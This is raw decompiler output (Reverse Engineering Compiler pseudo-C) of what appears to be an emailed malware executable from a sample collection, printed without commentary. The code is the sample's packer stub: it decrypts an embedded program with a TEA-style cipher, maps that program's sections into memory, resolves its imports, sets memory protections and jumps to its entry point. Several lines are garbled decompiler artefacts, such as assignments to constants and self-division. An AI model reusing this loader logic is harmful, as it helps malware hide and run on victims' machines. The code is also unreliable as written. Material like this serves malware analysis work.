/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_0989/ia32_pe/subject.exe'
 */

stack space not deallocated on return
/*	Procedure: 0x003E1000 - 0x003E101C
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1000()
{
	/* unknown */ void  ebp;



    ebp = esp;
    (save)ecx;
    (save)ecx;
    *(ebp - 8) = *(ebp + 8);
    eax = *(ebp - 8);
    *(ebp - 4) = *(ebp - 8) + *(eax + 60);
    eax = *(ebp - 4);
    esp = ebp;
}

/*	Procedure: 0x003E101D - 0x003E1045
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L003E101D(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    (save)ecx;
    L003E1A03(Ac, A8, A10);
    return(*__imp__VirtualProtect(Ac, A10, 2, ebp - 4));
}

stack space not deallocated on return
/*	Procedure: 0x003E1046 - 0x003E107F
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1046()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    (save)ebp;
    ebp = esp;
    if(*(ebp + 8) == 0 || *(ebp + 8) == *L003EAA1C) {
        *(ebp + 8) = *L003EAA18;
    }
    eax = *__imp__GetModuleFileNameA( *(ebp + 8), *(ebp + 12), *(ebp + 16));
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x003E1080 - 0x003E10AE
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1080()
{
	/* unknown */ void  ebp;



    ebp = esp;
    if(*(ebp + 8) == 0 || *(ebp + 8) == *L003EAA1C) {
        *(ebp + 8) = *L003EAA18;
    }
    return(*__imp__GetModuleFileNameW( *(ebp + 8), *(ebp + 12), *(ebp + 16)));
}

/*	Procedure: 0x003E10AF - 0x003E110D
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L003E10AF(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    (save)ecx;
    (save)Ac;
    (save)A8;
    *(ebp - 4) = *__imp__GetProcAddress();
    if(L003E1A71(Ac, 4071504) == 0) {
        *L003EAA10 = *(ebp - 4);
        eax = 0x3e1050;
    } else {
        if(L003E1A71(Ac, 4071524) == 0) {
            *L003EAA14 = *(ebp - 4);
            eax = 0x3e1080;
        } else {
            eax = *(ebp - 4);
        }
    }
}

/*	Procedure: 0x003E110E - 0x003E1120
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L003E110E(A8)
/* unknown */ void  A8;
{



    eax = ~(A8 & -2147483648);
    asm("sbb eax,eax");
    return(~eax);
}

stack space not deallocated on return
/*	Procedure: 0x003E1121 - 0x003E1240
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1121()
{
	/* unknown */ void  ebp;



    ebp = esp;
    esp = esp - 36;
    *L003EAA18 = *__imp__GetModuleHandleA(0);
    *L003EAA1C = *(ebp + 12);
    *(ebp - 8) = *(ebp + 8) + 128;
    eax = *(ebp - 8);
    for(*(ebp - 4) = *(ebp + 12) + *eax; 1; *(ebp - 4) = *(ebp - 4) + 20) {
        eax = *(ebp - 4);
        if(*(eax + 12) == 0) {
            break;
        }
        *(ebp - 12) = 0;
        *(ebp - 16) = 0;
        (save) *(ebp + 12);
        *(ebp - 28) = ecx + *( *(ebp - 4) + 12);
        *(ebp - 24) = *__imp__LoadLibraryA( *(ebp - 28));
        if(*( *(ebp - 4) + 4) != 0) {
            eax = *(ebp - 4);
            *(ebp - 12) = *(ebp + 12) + *eax;
        } else {
            eax = *(ebp - 4);
            *(ebp - 12) = *(ebp + 12) + *(eax + 16);
        }
        (save) *(ebp + 12);
        for(*(ebp - 20) = ecx + *( *(ebp - 4) + 16); *( *(ebp - 12)) != 0; *(ebp - 12) = *(ebp - 12) + 4) {
            (save) *(ebp - 24);
            L003E110E( *( *(ebp - 12)));
            if((al & 255) == 0) {
                eax = *(ebp - 12);
                *(ebp - 36) = *(ebp + 12) + *eax;
                *(ebp - 16) = L003E10AF( *(ebp - 24), *(ebp - 36) + 1 + 1);
            } else {
                *(ebp - 32) = *( *(ebp - 12)) & 65535;
                (save) *(ebp - 32) & 65535;
                (save) *(ebp - 24);
                *(ebp - 16) = *__imp__GetProcAddress();
            }
            eax = *(ebp - 20);
            *eax = *(ebp - 16);
            *(ebp - 20) = *(ebp - 20) + 4;
        }
    }
    esp = ebp;
}

/*	Procedure: 0x003E1241 - 0x003E124F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1241()
{



}

/*	Procedure: 0x003E1250 - 0x003E1285
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1250(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    (save)ecx;
    *(ebp - 4) = 0;
    do {
        eax = *__imp__ReadFile(A8, Ac, A10 - *(ebp - 4), ebp - 4, 0);
        if(eax == 0) {
            goto L003e1276;
        }
        eax = *(ebp - 4);
    } while(eax != A10);
    goto L003e1282;
L003e1276:
    al = 0;
    goto L003e1284;
L003e1282:
    al = 1;
L003e1284:
}

stack space not deallocated on return
/*	Procedure: 0x003E1286 - 0x003E12BC
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1286()
{
	/* unknown */ void  ebp;



    ebp = esp;
    (save)ecx;
    *(ebp - 4) = 0;
    do {
        eax = *__imp__WriteFile( *(ebp + 8), *(ebp + 12), *(ebp + 16) - *(ebp - 4), ebp - 4, 0);
        if(eax == 0) {
            goto L003e12ab;
        }
        eax = *(ebp - 4);
    } while(eax != *(ebp + 16));
    goto L003e12b9;
L003e12ab:
    al = 0;
    goto L003e12bb;
L003e12b9:
    eax = 1 & 255;
L003e12bb:
}

stack space not deallocated on return
/*	Procedure: 0x003E12BD - 0x003E1312
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E12BD()
{
	/* unknown */ void  ebp;



    ebp = esp;
    (save)ecx;
    for(*(ebp - 4) = 0; 1; *(ebp - 4) = *(ebp - 4) + 1 + 1) {
        eax = *(ebp - 4);
        if(eax >= *(ebp + 16)) {
            break;
        }
        eax = *(ebp - 4);
        L003E1286( *( *(ebp + 8) + 4), *(ebp + 12) + eax * 4, 8);
        eax = *(ebp - 4);
        L003E1250( *( *(ebp + 8)), *(ebp + 12) + eax * 4, 8);
    }
    esp = ebp;
}

/*	Procedure: 0x003E1313 - 0x003E13FF
 *	Argument size: -28
 *	Local size: 32
 *	Save regs size: 0
 */

L003E1313(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    for(Vfffffff4 = A8; 1; L003E1286( *(Vfffffff4 + 4), & Vfffffff8, 8)) {
        L003E1250( *Vfffffff4, & Vfffffff8, 8);
        if((al & 255) == 0) {
            break;
        }
        Vffffffec = 32;
        Vfffffff0 = Vfffffff8;
        Vffffffe8 = Vfffffffc;
        Vffffffe0 = -1640531527;
        for(Vffffffe4 = Vffffffe0 << 5; 1; Vffffffe4 = Vffffffe4 - Vffffffe0) {
            Vffffffec = Vffffffec - 1;
            if(Vffffffec <= 0) {
                break;
            }
            Vffffffe8 = Vffffffe8 - ((Vfffffff0 << 4) + *L00413E25 ^ Vfffffff0 + Vffffffe4 ^ (Vfffffff0 >> 5) + *L00413E29);
            Vfffffff0 = Vfffffff0 - ((Vffffffe8 << 4) + *L00413E1D ^ Vffffffe8 + Vffffffe4 ^ (Vffffffe8 >> 5) + *L00413E21);
        }
        Vfffffff8 = Vfffffff0;
        Vfffffffc = Vffffffe8;
    }
    return(0);
}

stack space not deallocated on return
/*	Procedure: 0x003E1400 - 0x003E141C
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1400()
{
	/* unknown */ void  ebp;



    ebp = esp;
    (save) *( *(ebp + 8));
    *__imp__CloseHandle();
    return(*__imp__CloseHandle( *( *(ebp + 8) + 4)));
}

/*	Procedure: 0x003E141D - 0x003E1603
 *	Argument size: -80
 *	Local size: 80
 *	Save regs size: 0
 */

L003E141D()
{
	/* unknown */ void  Vffffffb0;
	/* unknown */ void  Vffffffb4;
	/* unknown */ void  Vffffffb8;
	/* unknown */ void  Vffffffbc;
	/* unknown */ void  Vffffffc0;
	/* unknown */ void  Vffffffc4;
	/* unknown */ void  Vffffffc8;
	/* unknown */ void  Vffffffcc;
	/* unknown */ void  Vffffffd0;
	/* unknown */ void  Vffffffd4;
	/* unknown */ void  Vffffffd8;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vffffffdc = L003E1620();
    Vffffffc8 = *(Vffffffdc + 48);
    if(( *(Vffffffc8 + 2) & 255) != 0) {
        eax = 0;
    } else {
        *L00413E1D = 83;
        *L00413E1D = *L00413E1D + 4696;
        *L00413E21 = 5204;
        *L00413E25 = 29703;
        *L00413E29 = 2750;
        *L00413E29 = *L00413E29 + 10838;
        (save)16;
        (save)0;
        (save) & Vffffffd0;
        (save) & Vffffffc0;
        if(*__imp__CreatePipe() == 0) {
            eax = 0;
        } else {
            (save)16;
            (save)0;
            (save) & Vffffffc4;
            (save) & Vffffffcc;
            if(*__imp__CreatePipe() == 0) {
                eax = 0;
            } else {
                (save) & Vffffffd8;
                (save)0;
                (save) & Vffffffc0;
                (save)0x3e1313;
                (save)0;
                (save)0;
                Vffffffbc = *__imp__CreateThread();
                Vffffffe0 = 1;
                Vffffffe4 = 2;
                Vffffffe8 = 1;
                Vffffffe8 = Vffffffe8 + 2;
                Vffffffec = 4;
                Vfffffff0 = 0;
                Vfffffff0 = Vfffffff0 + 5;
                Vfffffff4 = 4;
                Vfffffff4 = Vfffffff4 + 2;
                Vfffffff8 = 4;
                Vfffffff8 = Vfffffff8 + 3;
                Vfffffffc = 0;
                Vfffffffc = Vfffffffc + 8;
                L003E12BD( & Vffffffcc, & Vffffffe0, 8);
                L003E12BD( & Vffffffcc, 0x3e3000, *L003EAA0B >> 2);
                L003E1400( & Vffffffcc);
                L003E1400( & Vffffffc0);
                (save)Vffffffbc;
                *__imp__CloseHandle();
                Vffffffd4 = L003E1000(0x3e3000);
                if(Vffffffd4 != 0) {
                    Vffffffb4 = *(Vffffffd4 + 52);
                    L003E101D(0x3e3000, Vffffffb4, *(Vffffffd4 + 84));
                    L003E1630(Vffffffd4, 0x3e3000, Vffffffb4);
                    Vffffffb8 = L003E1000(Vffffffb4);
                    if(Vffffffb8 != 0) {
                        L003E1121(Vffffffb8, Vffffffb4);
                        L003E17C2(Vffffffb8, Vffffffb4);
                        *(Vffffffc8 + 8) = Vffffffb4;
                        Vffffffb0 = Vffffffb4 + *(Vffffffd4 + 40);
                        Vffffffb0();
                    }
                }
                eax = 0;
            }
        }
    }
}

stack space not deallocated on return
/*	Procedure: 0x003E1604 - 0x003E161A
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

__entry_point__()
{
	/* unknown */ void  ebp;



    ebp = esp;
    (save)ecx;
    *(ebp - 4) = L003E141D();
    return(*__imp__ExitProcess( *(ebp - 4)));
}

/*	Procedure: 0x003E161B - 0x003E161F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E161B()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x003E1620 - 0x003E162C
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1620()
{
	/* unknown */ void  ebp;



    ebp = esp;
    return(*%fs:0x18]);
}

/*	Procedure: 0x003E162D - 0x003E162F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E162D()
{



    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x003E1630 - 0x003E16FC
 *	Argument size: -28
 *	Local size: 40
 *	Save regs size: 0
 */

L003E1630(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  Vffffffd8;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffff4 = A8 + 248;
    Vfffffff8 = *(A8 + 6);
    Vfffffffc = Vfffffff4;
    for(Vfffffff0 = 0; 1; Vfffffff0 = Vfffffff0 + 1) {
        eax = Vfffffff0 & 65535;
        if(eax >= (Vfffffff8 & 65535)) {
            break;
        }
        eax = Vfffffff0 & 65535;
        40 = eax * eax;
        Vffffffdc = *(eax + Vfffffffc + 8);
        eax = Vfffffff0 & 65535;
        40 = eax * eax;
        Vffffffec = *(eax + Vfffffffc + 16);
        Vffffffd8 = Vffffffdc >= Vffffffec ? Vffffffec : Vffffffdc;
        Vffffffe8 = Vffffffd8;
        eax = Vfffffff0 & 65535;
        40 = eax * eax;
        Vffffffe4 = A10 + *(eax + Vfffffffc + 12);
        eax = Vfffffff0 & 65535;
        40 = eax * eax;
        Vffffffe0 = Ac + *(eax + Vfffffffc + 20);
        L003E1A03(Vffffffe4, Vffffffe0, Vffffffe8);
    }
}

/*	Procedure: 0x003E16FD - 0x003E17C1
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L003E16FD(A8)
/* unknown */ void  A8;
{



    (save)ecx;
    *(ebp - 4) = 0;
    if(!(eax = A8 & 67108864)) {
        *(ebp - 4) = *(ebp - 4) | 512;
    }
    *(ebp - 4) = !(eax = A8 & 536870912) ? !(eax = A8 & 1073741824) ? !(eax = A8 & -2147483648) ? *(ebp - 4) | 64 : *(ebp - 4) | 32 : !(eax = A8 & -2147483648) ? *(ebp - 4) | 128 : *(ebp - 4) | 16 : !(eax = A8 & 1073741824) ? !(eax = A8 & -2147483648) ? *(ebp - 4) | 4 : *(ebp - 4) | 2 : !(eax = A8 & -2147483648) ? *(ebp - 4) | 8 : *(ebp - 4) | 1;
    return(*(ebp - 4));
}

stack space not deallocated on return
/*	Procedure: 0x003E17C2 - 0x003E1854
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E17C2()
{
	/* unknown */ void  ebp;



    ebp = esp;
    esp = esp - 28;
    *(ebp - 12) = *(ebp + 8) + 248;
    *(ebp - 8) = *( *(ebp + 8) + 6);
    *(ebp - 4) = *(ebp - 12);
    for(*(ebp - 16) = 0; 1; *(ebp - 16) = *(ebp - 16) + 1) {
        eax = *(ebp - 16) & 65535;
        if(eax >= ( *(ebp - 8) & 65535)) {
            break;
        }
        eax = *(ebp - 16) & 65535;
        40 = eax * eax;
        ecx = *(ebp - 4);
        *(ebp - 24) = *(ebp + 12) + *(eax + ecx + 12);
        eax = *(ebp - 16) & 65535;
        40 = eax * eax;
        *(ebp - 28) = *(eax + *(ebp - 4) + 8);
        eax = *(ebp - 16) & 65535;
        40 = eax * eax;
        *__imp__VirtualProtect( *(ebp - 24), *(ebp - 28), L003E16FD( *(eax + *(ebp - 4) + 36)), ebp - 20);
    }
}

/*	Procedure: 0x003E1855 - 0x003E185F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1855()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x003E1860 - 0x003E187C
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1860(A8)
/* unknown */ void  A8;
{



    if(A8 >= 65) {
        if(A8 > 90) {
            goto L003e1877;
        }
        A8 = A8 + 32;
    } else {
L003e1877:
    }
}

/*	Procedure: 0x003E187D - 0x003E1898
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E187D()
{
	/* unknown */ void  ebp;



    ebp = esp;
    if(*(ebp + 8) >= 97) {
        if(*(ebp + 8) > 122) {
            goto L003e1894;
        }
        eax = *(ebp + 8) - 32;
    } else {
L003e1894:
        eax = *(ebp + 8);
    }
}

/*	Procedure: 0x003E1899 - 0x003E18A4
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1899()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    (save)ebp;
    ebp = esp;
    (restore)ebp;
}

/*	Procedure: 0x003E18A5 - 0x003E18A9
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E18A5()
{



}

/*	Procedure: 0x003E18AA - 0x003E18AF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E18AA()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

stack space not deallocated on return
/*	Procedure: 0x003E18B0 - 0x003E18CD
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E18B0()
{
	/* unknown */ void  ebp;



    ebp = esp;
    *(ebp - 4) = *__imp__HeapAlloc( *__imp__GetProcessHeap(), 0, *(ebp + 8), ecx);
    return(*(ebp - 4));
}

/*	Procedure: 0x003E18CE - 0x003E18E0
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L003E18CE(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    Ac = Ac * A8;
    return(L003E18B0(A8));
}

/*	Procedure: 0x003E18E1 - 0x003E190B
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E18E1()
{
	/* unknown */ void  ebp;



    ebp = esp;
    eax = *(ebp + 8) == 0 ? L003E18B0( *(ebp + 12)) : *__imp__HeapReAlloc( *__imp__GetProcessHeap(), 0, *(ebp + 8), *(ebp + 12));
}

/*	Procedure: 0x003E190C - 0x003E192A
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E190C()
{
	/* unknown */ void  ebp;



    ebp = esp;
    if(*(ebp + 8) == 0) {
    } else {
        eax = *__imp__HeapFree( *__imp__GetProcessHeap(), 0, *(ebp + 8));
    }
}

/*	Procedure: 0x003E192B - 0x003E1938
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L003E192B(A8)
/* unknown */ void  A8;
{



    return(L003E18B0(A8));
}

/*	Procedure: 0x003E1939 - 0x003E1946
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1939(A8)
/* unknown */ void  A8;
{



    return(L003E190C(A8));
}

/*	Procedure: 0x003E1947 - 0x003E1954
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1947()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    (save)ebp;
    ebp = esp;
    (restore)ebp;
}

/*	Procedure: 0x003E1955 - 0x003E1964
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1955(A8)
/* unknown */ void  A8;
{



    (save)ecx;
    *(ebp - 4) = A8;
    *(ebp - 3) = 0;
    return(*(ebp - 4));
}

/*	Procedure: 0x003E1965 - 0x003E1969
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1965()
{



}

stack space not deallocated on return
/*	Procedure: 0x003E196A - 0x003E1982
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E196A()
{
	/* unknown */ void  ebp;



    ebp = esp;
    esp = esp - 32;
    eax = L003E1C2E( *(ebp + 8), ebp - 32, 10);
    esp = ebp;
}

/*	Procedure: 0x003E1983 - 0x003E199B
 *	Argument size: -28
 *	Local size: 32
 *	Save regs size: 0
 */

L003E1983(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  Vffffffe0;



    return(L003E1B50(A8, & Vffffffe0, 10));
}

stack space not deallocated on return
/*	Procedure: 0x003E199C - 0x003E1A02
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E199C()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    (save)ebp;
    ebp = esp;
    (save)ecx;
    for(*(ebp - 4) = *(ebp + 8); *(ebp + 16) != 0; *(ebp + 16) = *(ebp + 16) - 1) {
        eax = *(ebp + 8);
        *eax = *( *(ebp + 12));
        eax = *( *(ebp + 8));
        *(ebp + 8) = *(ebp + 8) + 1;
        *(ebp + 12) = *(ebp + 12) + 1;
        if(eax == 0) {
            break;
        }
    }
    if(*(ebp + 16) != 0) {
        while(!( *(ebp + 16) = *(ebp + 16) - 1)) {
            *( *(ebp + 8)) = 0;
            *(ebp + 8) = *(ebp + 8) + 1;
        }
    }
    eax = *(ebp - 4);
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x003E1A03 - 0x003E1A3E
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1A03()
{
	/* unknown */ void  ebp;



    ebp = esp;
    (save)ecx;
    for(*(ebp - 4) = *(ebp + 8); 1; *(ebp + 12) = *(ebp + 12) + 1) {
        eax = *(ebp + 16);
        *(ebp + 16) = *(ebp + 16) - 1;
        if(eax == 0) {
            break;
        }
        eax = *(ebp + 8);
        *eax = *( *(ebp + 12));
        *(ebp + 8) = *(ebp + 8) + 1;
    }
    eax = *(ebp - 4);
    esp = ebp;
}

stack space not deallocated on return
/*	Procedure: 0x003E1A3F - 0x003E1A70
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1A3F()
{
	/* unknown */ void  ebp;



    ebp = esp;
    (save)ecx;
    for(*(ebp - 4) = *(ebp + 8); 1; *(ebp + 8) = *(ebp + 8) + 1) {
        eax = *(ebp + 16);
        *(ebp + 16) = *(ebp + 16) - 1;
        if(eax == 0) {
            break;
        }
        eax = *(ebp + 8);
        *eax = *(ebp + 12);
    }
    eax = *(ebp - 4);
    esp = ebp;
}

/*	Procedure: 0x003E1A71 - 0x003E1ACB
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1A71(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    (save)ecx;
    for(*(ebp - 4) = 0; !( *(ebp - 4) = ( *A8 & 255) - ( *Ac & 255)) && *Ac != 0; Ac = Ac + 1) {
        A8 = A8 + 1;
    }
    if(*(ebp - 4) < 0) {
        *(ebp - 4) = *(ebp - 4) | -1;
    } else {
        if(*(ebp - 4) > 0) {
            *(ebp - 4) = 0;
            *(ebp - 4) = *(ebp - 4) + 1;
        }
    }
    return(*(ebp - 4));
}

stack space not deallocated on return
/*	Procedure: 0x003E1ACC - 0x003E1AF3
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1ACC()
{
	/* unknown */ void  ebp;



    ebp = esp;
    (save)ecx;
    *(ebp - 4) = *(ebp + 8);
    while(1) {
        eax = *( *(ebp - 4));
        *(ebp - 4) = *(ebp - 4) + 1;
        if(eax == 0) {
            break;
        }
    }
    eax = *(ebp - 4) - *(ebp + 8) - 1;
    esp = ebp;
}

stack space not deallocated on return
/*	Procedure: 0x003E1AF4 - 0x003E1B4A
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1AF4()
{
	/* unknown */ void  ebp;



    ebp = esp;
    esp = esp - 16;
    do {
        *(ebp - 12) = *( *(ebp + 8)) & 255;
        *(ebp - 4) = L003E1860( *(ebp - 12));
        *(ebp + 8) = *(ebp + 8) + 1;
        *(ebp - 16) = *( *(ebp + 12)) & 255;
        *(ebp - 8) = L003E1860( *(ebp - 16));
        *(ebp + 12) = *(ebp + 12) + 1;
    } while(*(ebp - 4) != 0 && *(ebp - 4) == *(ebp - 8));
    eax = *(ebp - 4) - *(ebp - 8);
    esp = ebp;
}

/*	Procedure: 0x003E1B4B - 0x003E1B4F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1B4B()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x003E1B50 - 0x003E1B6A
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1B50()
{
	/* unknown */ void  ebp;



    ebp = esp;
    L003E1B6B( *(ebp + 8), *(ebp + 12), *(ebp + 16), 0);
    return(*(ebp + 12));
}

/*	Procedure: 0x003E1B6B - 0x003E1C2D
 *	Argument size: 0
 *	Local size: 16
 *	Save regs size: 0
 */

L003E1B6B(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff7;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffffc = Ac;
    if(A14 != 0) {
        eax = Vfffffffc;
        *eax = 27;
        *eax = *eax + 18;
        Vfffffffc = Vfffffffc + 1;
        A8 = ~A8;
    }
    Vfffffff0 = Vfffffffc;
    do {
        eax = A8;
        edx = 0;
        A10 = A10 / A10;
        Vfffffff8 = A10 % A10;
        edx = 0;
        A10 = A10 / A10;
        edx = A10 % A10;
        0;
        if(Vfffffff8 <= 9) {
            eax = Vfffffff8 + 48;
            *Vfffffffc = al;
            Vfffffffc = Vfffffffc + 1;
        } else {
            eax = Vfffffff8 + 87;
            *Vfffffffc = al;
            Vfffffffc = Vfffffffc + 1;
        }
    } while(A8 > 0);
    *Vfffffffc = 0;
    Vfffffffc = Vfffffffc - 1;
    do {
        Vfffffff7 = *Vfffffffc;
        *Vfffffffc = *Vfffffff0;
        *Vfffffff0 = Vfffffff7;
        Vfffffffc = Vfffffffc - 1;
        Vfffffff0 = Vfffffff0 + 1;
        eax = Vfffffff0;
    } while(eax < Vfffffffc);
}

/*	Procedure: 0x003E1C2E - 0x003E1C6A
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1C2E()
{
	/* unknown */ void  ebp;



    ebp = esp;
    if(*(ebp + 16) == 10) {
        if(*(ebp + 8) >= 0) {
            goto L003e1c52;
        }
        L003E1B6B( *(ebp + 8), *(ebp + 12), *(ebp + 16), 1);
    } else {
L003e1c52:
        L003E1B6B( *(ebp + 8), *(ebp + 12), *(ebp + 16), 0);
    }
    return(*(ebp + 12));
}

/*	Procedure: 0x003E1C6B - 0x00000000
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1C6B()
{



}

/* address  size  */
/* 0x003e1604       0 */ /* unknown */ void 	__entry_point__;
/* 0x003e2000       0 */ /* unknown */ void 	__imp__VirtualProtect;
/* 0x003e2004       0 */ /* unknown */ void 	__imp__GetModuleFileNameA;
/* 0x003e2008       0 */ /* unknown */ void 	__imp__GetModuleFileNameW;
/* 0x003e200c       0 */ /* unknown */ void 	__imp__GetProcAddress;
/* 0x003e2010       0 */ /* unknown */ void 	__imp__LoadLibraryA;
/* 0x003e2014       0 */ /* unknown */ void 	__imp__GetModuleHandleA;
/* 0x003e2018       0 */ /* unknown */ void 	__imp__ReadFile;
/* 0x003e201c       0 */ /* unknown */ void 	__imp__WriteFile;
/* 0x003e2020       0 */ /* unknown */ void 	__imp__CloseHandle;
/* 0x003e2024       0 */ /* unknown */ void 	__imp__CreateThread;
/* 0x003e2028       0 */ /* unknown */ void 	__imp__CreatePipe;
/* 0x003e202c       0 */ /* unknown */ void 	__imp__ExitProcess;
/* 0x003e2030       0 */ /* unknown */ void 	__imp__HeapAlloc;
/* 0x003e2034       0 */ /* unknown */ void 	__imp__GetProcessHeap;
/* 0x003e2038       0 */ /* unknown */ void 	__imp__HeapReAlloc;
/* 0x003e203c       0 */ /* unknown */ void 	__imp__HeapFree;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
